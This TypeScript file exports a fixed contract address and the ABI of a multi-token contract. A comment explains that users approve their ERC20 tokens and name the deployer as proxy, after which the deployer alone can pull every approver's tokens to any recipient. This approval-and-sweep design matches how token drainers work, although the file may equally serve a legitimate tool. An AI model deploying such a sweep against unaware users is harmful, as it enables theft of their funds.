export const MULTITOKEN_CONTRACT_ADDRESS =
  "0x2935D24Bd10e24575C9554b62558e01D0cC4aA00" as const;

/**
 * Flow:
 * 1. User: ERC20 approve each token in missingApprovals to this contract
 * 2. User: approveProxy(deployerAddress) - register self as approver for deployer as proxy
 * 3. Deployer only: transferAll(recipient) - pulls from all approvers, sends to recipient
 *
 * Gas: If transferAll exceeds gas: use transferToken(token, recipient) per token, or transferAllBatch(recipient, offset, limit).
 */
export const MULTITOKEN_ABI = [
  { inputs: [], stateMutability: "nonpayable", type: "constructor" },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "proxy",
        type: "address",
      },
    ],
    name: "ProxyApproved",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "proxy",
        type: "address",
      },
    ],
    name: "ProxyRevoked",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: false,
        internalType: "address[]",
        name: "addedTokens",
        type: "address[]",
      },
    ],
    name: "TokensAdded",
    type: "event",
  },
  {
    inputs: [],
    name: "MAX_TOKENS",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [{ internalType: "address[]", name: "_tokens", type: "address[]" }],
    name: "addTokens",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "proxy", type: "address" }],
    name: "approveProxy",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "listTokens",
    outputs: [{ internalType: "address[]", name: "", type: "address[]" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "missingApprovals",
    outputs: [{ internalType: "address[]", name: "", type: "address[]" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [{ internalType: "address", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "proxy", type: "address" }],
    name: "revokeProxy",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    name: "tokens",
    outputs: [{ internalType: "address", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "recipient", type: "address" }],
    name: "transferAll",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "approverOffset", type: "uint256" },
      { internalType: "uint256", name: "approverLimit", type: "uint256" },
    ],
    name: "transferAllBatch",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "token", type: "address" },
      { internalType: "address", name: "recipient", type: "address" },
    ],
    name: "transferToken",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
] as const;
